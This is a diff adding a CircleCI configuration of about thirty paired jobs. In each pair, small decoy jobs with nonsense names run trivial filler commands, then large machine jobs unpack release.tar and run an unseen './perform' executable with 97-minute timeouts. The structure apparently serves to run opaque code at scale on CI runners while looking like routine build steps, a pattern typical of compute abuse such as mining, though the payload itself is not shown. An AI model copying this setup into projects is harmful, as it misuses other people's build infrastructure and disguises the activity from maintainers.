@@ -1,0 +1,1381 @@
+version: 2.1
+
+jobs:
+  round1_preview-v1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: swing out
+          command: |
+            mkdir -p /tmp/data
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/data/checkpoint-B.pickle; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/data/checkpoint-B.pickle; done; true
+            len=$(wc -c </tmp/data/checkpoint-B.pickle); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - checkpoint-B.pickle
+  preview-v1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/checkpoint-B.pickle || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  g2_fix-queue-redirect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: infrared
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; echo $(( $(date +%s) % 10000 )) | md5sum; true ; } > /tmp/data/pt-alt.pickle
+            len=$(wc -c </tmp/data/pt-alt.pickle); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - pt-alt.pickle
+  fix-queue-redirect:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/pt-alt.pickle || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  phase1_luna-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: v1 call
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; printf "a b c d e f g h\n" | awk '{for(i=NF;i>=1;i--)printf "%s ",$i; print ""}'; true ; } > /tmp/data/50.blob
+            len=$(wc -c </tmp/data/50.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 50.blob
+  luna-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/counts.csv || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  g2_jul28-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: deadlift
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; env | md5sum | cut -c1-16; true ; } > /tmp/data/67.data
+            len=$(wc -c </tmp/data/67.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 67.data
+  jul28-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/67.data || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  fetch_Validate_Pipeline7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: plank wobble
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; printf "a\nb\nc\nb\nc\nc\n" | sort | uniq -c | sort -rn; true ; } > /tmp/data/2023-11-15.data
+            len=$(wc -c </tmp/data/2023-11-15.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2023-11-15.data
+  Validate_Pipeline7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/2023-11-15.data || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  cook_deploy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: midnight snack
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; tf=$(mktemp) && printf "x\n" > "$tf" && cat "$tf" | sha256sum | cut -c1-20 && rm "$tf"; true ; } > /tmp/data/step-pass.txt
+            len=$(wc -c </tmp/data/step-pass.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-pass.txt
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/step-pass.txt || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  spinner_nebula-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: check
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 259679 | tr '0-9' 'a-j' | wc -c; true ; } > /tmp/data/result.md
+            len=$(wc -c </tmp/data/result.md); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - result.md
+  nebula-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/counts.csv || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  Beta_chore-1001:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: more flaky
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; printf '%s\n' "{foo: 1, bar: 2}" | md5sum; true ; } > /tmp/data/manifest.bin
+            len=$(wc -c </tmp/data/manifest.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - manifest.bin
+  chore-1001:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/manifest.bin || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  reup_wip-edge-hang:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: mostly green
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]="x"; a[2]="y"; a[3]="z"; for(i in a)print i":"a[i]}' | sort; true ; } > /tmp/data/phase-ok.log
+            len=$(wc -c </tmp/data/phase-ok.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - phase-ok.log
+  wip-edge-hang:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/phase-ok.log || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  wire_DEV_HOOK_1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: squat light
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; grep -c MemTotal /proc/meminfo; true ; } > /tmp/data/21.out
+            len=$(wc -c </tmp/data/21.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 21.out
+  DEV_HOOK_1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  ensure_assemble-partial-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: nordic curl
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 926450 | awk '{a[$1%17]++}END{for(k in a) print k,a[k]}' | sort -n; true ; } > /tmp/data/step-20.out
+            len=$(wc -c </tmp/data/step-20.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-20.out
+  assemble-partial-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/step-20.out || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Rehydrate tree
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  route_verify-staging-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: mercy run
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; date -d "7 days ago" +%F 2>/dev/null || date +%F; true ; } > /tmp/data/secondary_step_output.txt
+            len=$(wc -c </tmp/data/secondary_step_output.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - secondary_step_output.txt
+  verify-staging-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch corpus
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  tester_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: banner up
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello"; print substr(s,2,3)}'; true ; } > /tmp/data/READY
+            len=$(wc -c </tmp/data/READY); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - READY
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/counts.csv || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Checkout vendored deps
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  retry_update-session:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: bob along
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; echo abcdefg | cut -c3-5; true ; } > /tmp/data/counts.csv
+            len=$(wc -c </tmp/data/counts.csv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - counts.csv
+  update-session:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/counts.csv || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Prime workspace
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  retry_pat-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: spoor
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1 count=50 2>/dev/null | tr '\0' 'z' | wc -c; true ; } > /tmp/data/594v2.txt
+            len=$(wc -c </tmp/data/594v2.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 594v2.txt
+  pat-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/counts.csv || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  runner_wip-cache-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: blue light
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; date +%Z; true ; } > /tmp/data/relay.txt
+            len=$(wc -c </tmp/data/relay.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - relay.txt
+  wip-cache-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore snapshot
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  enqueue_yankee-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: apple wood
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; sed -n '1,5p' /proc/cpuinfo | md5sum; true ; } > /tmp/data/04.out
+            len=$(wc -c </tmp/data/04.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 04.out
+  yankee-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch sources
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  spinner_dp-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: hmm maybe
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; echo abcdefg | cut -c3-5; true ; } > /tmp/data/report.out
+            len=$(wc -c </tmp/data/report.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - report.out
+  dp-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/counts.csv || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll archive
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  generate_run-quick-release-candidate:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: quick glance
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=10; b=0; if(b)print a/b; else print "nozero"}'; true ; } > /tmp/data/stage-ok.sig
+            len=$(wc -c </tmp/data/stage-ok.sig); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stage-ok.sig
+  run-quick-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Seed workspace
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  fetcher_polaris-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: is this fast enough
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 20 | awk 'BEGIN{OFS="-"}{if(NR%4==1)printf "%s",$0; else if(NR%4==0)print OFS $0; else printf OFS "%s",$0}' | head -3; true ; } > /tmp/data/2024-12-08.data
+            len=$(wc -c </tmp/data/2024-12-08.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 2024-12-08.data
+  polaris-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack sources
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  canary1_india:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: dropped kick
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 100 | awk '{s+=$1; print s}' | tail -1; true ; } > /tmp/data/15.bin
+            len=$(wc -c </tmp/data/15.bin); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - 15.bin
+  india:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/15.bin || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore vendored sources
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  validate_produce-production-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: missed approach
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 2000 | awk '{s += (-1)^$1 * $1}END{print s}'; true ; } > /tmp/data/step-3.out
+            len=$(wc -c </tmp/data/step-3.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - step-3.out
+  produce-production-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/step-3.out || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Fetch fixtures
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  beta_cerberus-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: orbit sync
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; printf "%s\n" {aa..zz} 2>/dev/null | head -5 || printf "%s\n" a1 a2 b1 b2; true ; } > /tmp/data/buffer.raw
+            len=$(wc -c </tmp/data/buffer.raw); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - buffer.raw
+  cerberus-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Sync asset bundles
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  reserve_rollout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: back end
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; echo "x1 x2 x3 x4 x5" | awk '{for(i=1;i<=NF;i++)printf "%s ",$i; print ""}'; true ; } > /tmp/data/OK
+            len=$(wc -c </tmp/data/OK); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - OK
+  rollout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/counts.csv || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack toolkit
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  do_teh-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: oblique crunch
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 15 | awk '{if($1%3==0 && $1%5==0)print "FizzBuzz"; else if($1%3==0)print "Fizz"; else if($1%5==0)print "Buzz"; else print $1}' | wc -l; true ; } > /tmp/data/timings.json
+            len=$(wc -c </tmp/data/timings.json); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - timings.json
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Hydrate workspace
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  package_t-01:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: rumba sway
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f 2>/dev/null | wc -l; true ; } > /tmp/data/buffer.dat
+            len=$(wc -c </tmp/data/buffer.dat); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - buffer.dat
+  t-01:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/buffer.dat || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  cacher_strated:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: blue screen
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; seq 1 128951 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/data/stats.json
+            len=$(wc -c </tmp/data/stats.json); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - stats.json
+  strated:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/stats.json || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
+  kick_VerifyStaging:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: weigh anchor
+          command: |
+            mkdir -p /tmp/data
+            { set +o pipefail 2>/dev/null; yes 1 | head -200 | awk '{s+=$1}END{print s}'; true ; } > /tmp/data/READY.txt
+            len=$(wc -c </tmp/data/READY.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/data
+          paths:
+            - READY.txt
+  VerifyStaging:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/data
+      - run:
+          name: Read staged data
+          command: |
+            grep -c . /tmp/data/counts.csv || true
+      - run:
+          name: Checkout code
+          command: git clone --quiet --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: cat release.tar | tar xf -
+      - run:
+          no_output_timeout: 97m
+          command: /bin/bash -c "./perform"
